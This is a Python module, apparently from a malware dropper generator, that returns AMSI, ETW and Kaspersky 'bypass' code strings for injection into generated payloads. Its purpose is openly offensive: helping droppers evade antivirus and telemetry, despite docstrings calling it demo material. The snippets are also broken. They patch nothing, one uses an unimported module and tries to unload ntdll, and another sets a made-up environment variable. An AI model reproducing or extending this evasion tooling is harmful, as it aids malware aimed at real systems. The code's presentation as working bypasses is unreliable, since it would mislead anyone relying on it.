"""AV bypass snippets provider.

This module returns small Python code snippets that can be injected
into generated droppers to attempt various platform-specific
evasion techniques. The snippets are intentionally non-invasive and
mostly placeholders; they are provided to support testing and demo
scenarios only.

Note: These snippets are not guaranteed to work and are included for
completeness of the dropper templates. Use responsibly.
"""

import random


class AVBypass:
    """Return small code snippets that attempt AV/telemetry evasion.

    Methods return strings containing Python code which is later
    injected verbatim into generated payloads.
    """

    def get_amsi_bypass(self):
        """Return a randomly selected AMSI bypass snippet.

        These are simple heuristics that attempt to touch AMSI-related
        APIs on Windows. They are intentionally wrapped in try/except
        to be safe on non-Windows platforms.
        """
        bypasses = [
            '''
# AMSI bypass for Python
import ctypes
import sys
if sys.platform == 'win32':
    try:
        ctypes.windll.amsi.AMSI_RESULT_CLEAN = 0
        ctypes.windll.amsi.AmsiInitialize.argtypes = [ctypes.c_wchar_p, ctypes.c_void_p]
        ctypes.windll.amsi.AmsiInitialize.restype = ctypes.c_ulong
    except:
        pass
''',
            '''
# Alternative AMSI bypass
import ctypes
import sys
if sys.platform == 'win32':
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
        kernel32.VirtualProtect.restype = ctypes.c_bool
    except:
        pass
'''
        ]
        return random.choice(bypasses)

    def get_etw_bypass(self):
        """Return a small ETW bypass snippet.

        The snippet attempts to free ETW-related libraries on Windows.
        It is a noop on other platforms.
        """
        return '''
# ETW bypass
import sys
if sys.platform == 'win32':
    try:
        import _ctypes
        _ctypes.FreeLibrary(ctypes.windll.ntdll._handle)
    except:
        pass
'''

    def get_kaspersky_bypass(self):
        """Return a tiny environment-based Kaspersky evasion snippet.

        This sets a couple of environment variables that some tooling
        might interpret; it's a non-destructive placeholder.
        """
        return '''
# Kaspersky evasion
import os
try:
    os.environ['__COMPAT_LAYER'] = 'RunAsInvoker'
    os.environ['KASPERSKY_BYPASS'] = '1'
except:
    pass
'''